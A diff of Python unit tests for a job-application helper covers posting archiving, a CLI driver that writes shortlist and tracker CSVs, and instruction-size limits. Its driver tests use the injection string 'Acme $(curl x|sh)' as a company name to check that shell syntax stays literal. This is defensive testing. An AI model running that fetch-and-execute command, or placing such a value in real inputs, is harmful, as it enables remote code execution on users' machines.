@@ -216,17 +216,116 @@ class Boards(unittest.TestCase):
         self.assertEqual([], ls.other_market(boards, []))
 
 
-class Output(unittest.TestCase):
-    def test_fold_is_ascii_and_keeps_nordic_letters_readable(self):
-        self.assertEqual("Kobenhavn - Arhus", ls.fold("København – Århus"))
-        self.assertEqual("?", ls.fold("京"))
+class Save(unittest.TestCase):
+    """--save archives the posting so the model never retypes it (the e2e run wrote
+    every posting twice, by hand)."""
+
+    def test_row_is_fetched_and_archived_where_apply_package_looks(self):
+        import json
+        import subprocess
+        from types import SimpleNamespace
+        from unittest import mock
+
+        tmp = Path(tempfile.mkdtemp(prefix="lite-save-"))
+        try:
+            (tmp / "state").mkdir()
+            row = {"title": "Data Analyst", "company": "Acme", "location": "Winnipeg, MB",
+                   "url": "https://example.com/1", "id": "42", "board": "linkedin-search"}
+            (tmp / "state" / "lite-last-search.json").write_text(
+                json.dumps({"date": "2026-10-02", "results": [row]}), encoding="utf-8")
+            body = "Requirements: SQL, Excel and stakeholder reporting. " * 20
+            done = subprocess.CompletedProcess([], 0, stdout=body, stderr="")
+            with mock.patch.object(ls.shutil, "which", return_value="bun"), \
+                 mock.patch.object(ls.subprocess, "run", return_value=done), \
+                 mock.patch("builtins.print"):
+                code = ls.save(SimpleNamespace(root=str(tmp), save=1))
+            self.assertEqual(0, code)
+            folder = next((tmp / "documents" / "applications").iterdir())
+            self.assertIn("SQL, Excel", (folder / "job_posting.md").read_text(encoding="utf-8"))
+            self.assertIn("posting_state: verified",
+                          (folder / "provenance.md").read_text(encoding="utf-8"))
+            self.assertTrue((folder / "posting_source" / "linkedin-search_detail.md").is_file())
+        finally:
+            shutil.rmtree(tmp, ignore_errors=True)
+
+
+class Driver(unittest.TestCase):
+    """Posting text reaches the CSVs as Python values, never through a shell, so `$`
+    and `$(...)` in a company, title or salary stay literal (review finding: a
+    double-quoted rationale turned "$85,000" into "5,000")."""
+
+    def setUp(self):
+        import json
+        self.json = json
+        self.tmp = Path(tempfile.mkdtemp(prefix="lite-driver-"))
+        (self.tmp / "state").mkdir()
+        (self.tmp / "state" / "lite-apply.json").write_text(json.dumps({
+            "company": "Acme $(curl x|sh)", "role": "Analyst $85,000",
+            "url": "https://example.com/1", "location": "Winnipeg", "channel": "pasted"}),
+            encoding="utf-8")
+
+    def tearDown(self):
+        shutil.rmtree(self.tmp, ignore_errors=True)
+
+    def run_main(self, *args):
+        from unittest import mock
+        with mock.patch("builtins.print"), mock.patch.object(ls.sys.stdout, "reconfigure"):
+            return ls.main(["--root", str(self.tmp), *args])
+
+    def test_start_then_verdict_keeps_hostile_text_literal(self):
+        self.assertEqual(0, self.run_main("--start"))
+        meta = self.json.loads((self.tmp / "state" / "lite-apply.json").read_text(encoding="utf-8"))
+        self.assertTrue((self.tmp / meta["folder"] / "posting_source").is_dir())
+        self.assertEqual(0, self.run_main("--verdict", "not-drafted", "--score", "55",
+                                          "--rationale", "fit too low"))
+        text = (self.tmp / "shortlist.csv").read_text(encoding="utf-8")
+        self.assertIn("Acme $(curl x|sh)", text)
+        self.assertIn("Analyst $85,000", text)
+
+    def test_package_uses_the_stored_values_and_archives_a_pasted_posting(self):
+        from unittest import mock
+        self.run_main("--start")
+        meta = self.json.loads((self.tmp / "state" / "lite-apply.json").read_text(encoding="utf-8"))
+        (self.tmp / meta["folder"] / "job_posting.md").write_text("posting text", encoding="utf-8")
+        import apply_package
+        with mock.patch.object(apply_package, "main", return_value=0) as built:
+            self.assertEqual(0, self.run_main("--package", "--score", "82",
+                                              "--rationale", "strong match"))
+        argv = built.call_args.args[0]
+        self.assertEqual("Acme $(curl x|sh)", argv[argv.index("--company") + 1])
+        self.assertEqual(f"cv/main_{meta['slug']}.tex", argv[argv.index("--cv") + 1])
+        self.assertTrue((self.tmp / meta["folder"] / "posting_source" / "posting.md").is_file())
+        self.assertIn("qualified", (self.tmp / "shortlist.csv").read_text(encoding="utf-8"))
+
+    def test_applied_marks_the_posting_in_progress_submitted(self):
+        from unittest import mock
+        import tracker_row
+        self.run_main("--start")
+        tracker = self.tmp / "tracker.csv"
+        tracker_row.append({"company": "Acme $(curl x|sh)", "role": "Analyst $85,000",
+                            "status": "in_progress"}, tracker)
+        with mock.patch.object(tracker_row, "TRACKER_CSV", tracker):
+            self.assertEqual(0, self.run_main("--applied"))
+            self.assertEqual(0, self.run_main("--applied", "rejected"))
+        row = tracker_row.read_rows(tracker)[0][0]
+        self.assertTrue(row["submitted_date"])
+        self.assertEqual("rejected", row["status"])
 
 
 class LiteSpec(unittest.TestCase):
-    def test_the_spec_stays_under_the_10_kb_the_docs_promise(self):
-        """README, USER-GUIDE, setup and the installer all say "under 10 KB"; the
-        spec is injected on every /lite call, so growth costs every user."""
-        self.assertLess((ROOT / ".claude" / "commands" / "lite.md").stat().st_size, 10 * 1024)
+    def test_an_application_reads_about_the_7_kb_the_docs_promise(self):
+        """README, USER-GUIDE, setup and the installer say a lite application reads
+        about 7 KB of instructions (against about 160 KB on the standard route): the
+        router, injected on every /lite call, plus the apply steps."""
+        size = sum((ROOT / path).stat().st_size
+                   for path in (".claude/commands/lite.md", ".claude/lite/apply.md"))
+        self.assertLess(size, 8 * 1024)
+
+    def test_the_router_names_every_step_file_it_delegates_to(self):
+        router = (ROOT / ".claude" / "commands" / "lite.md").read_text(encoding="utf-8")
+        for step_file in (".claude/lite/setup.md", ".claude/lite/apply.md"):
+            self.assertIn(step_file, router)
+            self.assertTrue((ROOT / step_file).is_file(), step_file)
 
 
 if __name__ == "__main__":
